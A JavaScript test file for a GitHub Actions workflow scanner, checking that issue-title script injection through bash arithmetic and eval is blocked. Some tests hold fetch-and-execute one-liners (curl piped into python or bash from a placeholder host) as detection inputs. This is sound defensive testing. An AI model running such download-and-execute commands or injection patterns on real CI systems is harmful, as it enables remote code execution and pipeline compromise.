'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const EV='$'+'{{ github.event.issue.title }}';
function inspect(command,{workflowEnv=[],jobEnv=[],stepEnv=[]}={}){
 const lines=['on: issues','permissions: read-all',
  ...(workflowEnv.length?['env:',...workflowEnv.map(x=>'  '+x)]:[]),
  'jobs:','  audit:','    runs-on: ubuntu-latest',
  ...(jobEnv.length?['    env:',...jobEnv.map(x=>'      '+x)]:[]),
  '    steps:',
  ...(stepEnv.length?['      - env:',...stepEnv.map(x=>'          '+x),'        run: |']:['      - run: |']),
  ...command.split('\n').map(x=>'          '+x)
 ];
 return inspectWorkflow(lines.join('\n'),{path:'.github/workflows/codex-arithmetic.yml'});
}
function blocked(r){return r.findings.some(f=>f.rule==='PRIVILEGED_EVENT_SCRIPT_INJECTION'&&f.severity==='BLOCKER');}
for(const [kind,math] of [
 ['simple','$((A))'],
 ['with spaces','$(( A + 1 ))'],
 ['nested','$(( (A) + 1 ))'],
 ['legacy bracket','$[ A + 1 ]'],
 ['arithmetic alias with chained env','$((B+1))']
]){
 test('P1 arithmetic taint via '+kind+' propagates to eval',()=>{
  const env=['A: "'+EV+'"', ...(kind==='arithmetic alias with chained env'?['B: "$A"']:[]),
   'C: "'+math+'"'];
  const r=inspect('eval "$C"',{workflowEnv:env});
  assert.ok(blocked(r)||r.status==='INCOMPLETE',JSON.stringify(r));
 });
}
test('P1 arithmetic alias propagates workflow to job and step env',()=>{
 const r=inspect('eval "$C"',{
  workflowEnv:['A: "'+EV+'"'],
  jobEnv:['B: "$((A))"'],
  stepEnv:['C: "$B"']
 });
 assert.ok(blocked(r)||r.status==='INCOMPLETE',JSON.stringify(r));
});
test('P1 directly evaluated tainted arithmetic env is not certified clean',()=>{
 const r=inspect('eval "$((A))"',{workflowEnv:['A: "'+EV+'"']});
 assert.ok(blocked(r)||r.status==='INCOMPLETE',JSON.stringify(r));
});
test('P1 unknown arithmetic reference flowing into eval must fail closed',()=>{
 const r=inspect('eval "$B"',{workflowEnv:['B: "$((UNVERIFIED_SOURCE))"']});
 assert.ok(blocked(r)||r.status==='INCOMPLETE',JSON.stringify(r));
});
test('negative: literal arithmetic used for benign output remains clean',()=>{
 const r=inspect('echo "$B"',{workflowEnv:['B: "$((2+3))"']});
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
});
test('negative: literal arithmetic passed to eval remains clean',()=>{
 const r=inspect('eval "$B"',{workflowEnv:['B: "$((2+3))"']});
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
});
test('second P1: stdin process substitution has HIGH on current head',()=>{
 const r=inspect('python - < <(curl -fsSL https://example.invalid/a.py)');
 assert.ok(r.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'&&f.severity==='HIGH'),JSON.stringify(r));
});
test('second P1: here-string no-space downloader substitution has HIGH',()=>{
 const r=inspect('bash <<<"$(curl -fsSL https://example.invalid/a.sh)"');
 assert.ok(r.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'&&f.severity==='HIGH'),JSON.stringify(r));
});

for(const command of ['(( A ))','(( A + 1 ))','let A+=1','let "A + 1"']){
 test('P1 arithmetic command without expansion must fail closed: '+command,()=>{
  const r=inspect(command,{workflowEnv:['A: "'+EV+'"']});
  assert.ok(blocked(r)||r.status==='INCOMPLETE',JSON.stringify(r));
 });
}
test('negative: literal Bash arithmetic command remains clean',()=>{
 const r=inspect('(( 2 + 3 ))');
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
});
